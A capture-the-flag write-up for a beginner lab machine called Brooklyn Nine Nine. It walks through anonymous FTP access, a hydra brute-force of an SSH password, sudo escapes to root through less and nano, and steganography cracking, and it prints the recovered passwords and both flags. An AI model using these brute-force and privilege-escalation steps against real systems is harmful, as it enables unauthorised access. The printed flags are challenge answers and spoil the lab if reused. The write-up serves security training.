# Brooklyn Nine Nine Writeup

> Machine : Linux

> This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.

## Solution

First reconnaissance and port scanning.

```shell
nmap -sV -sC -Pn --open 10.128.158.26 -p-
```

From our results, we can see ports 21 (FTP), 22 (SSH) and 80 (HTTP) are open. And `anonymous` login was allowed. 

Let's start with `FTP` first.

```shell
ftp 10.128.158.26
anonymous
```

```shell
ls
```

```text
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
```

```shell
mget note_to_jake.txt
```

```shell
cat note_to_jake.txt
```

```text
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

So we know that there is a user `jake` and he has a weak password.

```shell
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.128.158.26/
```

```text
[22][ssh] host: 10.128.158.26   login: jake   password: 987654321
```

So let's try enter using `SSH`.

```shell
ssh jake@10.128.158.26
987654321
```

And we are in.

```shell
cat /home/holt/user.txt
```

```text
ee11cbb19052e40b07aac0ca060c23ee
```

> User flag
> 
> ee11cbb19052e40b07aac0ca060c23ee

```shell
sudo -l
```

```shell
(ALL) NOPASSWD: /usr/bin/less
```

```shell
sudo less /etc/hosts
!/bin/sh
```

```shell
whoami
```

```shell
root
```

That's it now we can read the root flag. But let's try enter the other way using `HTTP`.

Browsing the IP we found an image, and after viewing the source code we found:

```html
<!-- Have you ever heard of steganography? -->
```

So That's a hint tells us there is something hiding on this image.

```shell
wget "http://10.128.158.26/brooklyn99.jpg"
```

Using the tool `steghide` can help.

```shell
steghide extract -sf brooklyn99.jpg
```

There is a `passphrase` we have to enter. Also here we have to use another tool and i chose `stegcracker`.

```shell
stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```

That's it the passphrase is `admin`.

```shell
steghide extract -sf brooklyn99.jpg
admin
```

```text
wrote extracted data to "note.txt".
```

```shell
cat note.txt
```

```text
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

```shell
ssh holt@10.128.158.26
```

```shell
sudo -l
```

```text
(ALL) NOPASSWD: /bin/nano
```

```shell
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

```shell
cat /root/root.txt
```

```text
63a9f0ea7bb98050796b649e85481845
```

> root.txt
> 
> 63a9f0ea7bb98050796b649e85481845

